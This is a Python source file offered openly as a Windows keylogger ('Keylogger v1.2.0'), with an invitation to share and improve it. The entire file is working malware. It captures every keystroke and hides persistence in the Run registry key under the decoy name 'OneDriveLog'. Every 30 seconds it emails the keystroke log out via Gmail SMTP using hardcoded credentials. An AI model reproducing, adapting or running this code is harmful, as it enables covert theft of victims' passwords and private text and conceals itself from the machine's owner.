import keyboard
from os.path import exists
from threading import Timer
import time
import socket
import smtplib
import winreg

"""
                    **********      Keylogger v1.2.0        **********
                    
This program was written by @H4ck3r227
You can optimize it and share to the community
In this way try to comment a lot so that others can easily understand the code

"""
PATH_TO_KEY = r'Software\Microsoft\Windows\CurrentVersion\Run'
PATH_TO_KEYLOGGER = __file__
SEND_REPORT_DELAY = 10
EMAIL_ADDRESS= "loggerk907@gmail.com"
EMAIL_PASSWORD = "LoggerK907!"

class Keylogger:
    #List of all keys that the user stroke in a whil

    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.addToStartup()

    def addToStartup(self):
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, PATH_TO_KEY, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, 'OneDriveLog', 0, winreg.REG_SZ, PATH_TO_KEYLOGGER)
            key.Close

    #Function that create the dayly log file if it doesn't exists
    def create_dayly_log(self):
        #Here we open create the file then put the Header
        with open(f"{self.start_dt.tm_mday}-{self.start_dt.tm_mon}-{self.start_dt.tm_year}.txt", 'w') as f:
            header=f"***************This is the log of the {self.start_dt.tm_mday}-{self.start_dt.tm_mon}-{self.start_dt.tm_year} created at {self.start_dt.tm_hour}:{self.start_dt.tm_min}:{self.start_dt.tm_sec}********************"
            f.write(header + "\n\n")

    #The on_press callback called by the keyboard listener
    def callback(self, event):
        # This line tells us if the key that the user stroke is an alphanumeric key or else
        # If it returns 1 the key is not alphanumeric
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = '[' + name + ']\n'
            else:
                name ='[' + name + ']'
        self.log += name

    def report_to_file(self):
        with open(f"{self.start_dt.tm_mday}-{self.start_dt.tm_mon}-{self.start_dt.tm_year}.txt", 'a') as f:
            f.write(self.log)
            print(f"[+] Uplaod log in {self.start_dt.tm_mday}-{self.start_dt.tm_mon}-{self.start_dt.tm_year}.txt")

    def isInternet(self, host="8.8.8.8", port=53, timeout=3):
        try:
            socket.setdefaulttimeout(timeout)
            socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
            print("ping successfull !!!")
            return True
        except:
            return False

    def read_daily_log(self):
        with open(f"{self.start_dt.tm_mday}-{self.start_dt.tm_mon}-{self.start_dt.tm_year}.txt", 'r') as f:
            print("Reading log file in order to send it...")
            return f.read()

    def send_by_mail(self, email, password):
        if self.isInternet():
            server = smtplib.SMTP(host="smtp.gmail.com",port=587)
            server.starttls()
            print("TLS started...")
            server.login(email, password)
            print("Login done...")
            server.sendmail(email, email, self.read_daily_log())
            print("Mail sent...")
        timer1 = Timer(interval=30, function=self.send_by_mail, args=[email, password])
        timer1.daemon = True
        timer1.start()

        
    # The function that write all the list of keys in the variable "keys" in the daily log file
    def report(self):
        if len(self.log):
            self.report_to_file()
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = time.localtime(time.time())
        #Here we see if the dayly log file exists if not we create it
        if exists(f"{self.start_dt.tm_mday}-{self.start_dt.tm_mon}-{self.start_dt.tm_year}.txt") != True:
            self.create_dayly_log()
        keyboard.on_release(callback=self.callback)
        self.report()
        if exists(f"{self.start_dt.tm_mday}-{self.start_dt.tm_mon}-{self.start_dt.tm_year}.txt"):
            self.send_by_mail(EMAIL_ADDRESS, EMAIL_PASSWORD)
        keyboard.wait()


if __name__ == "__main__":

    keylogger = Keylogger(interval=SEND_REPORT_DELAY)
    keylogger.start()
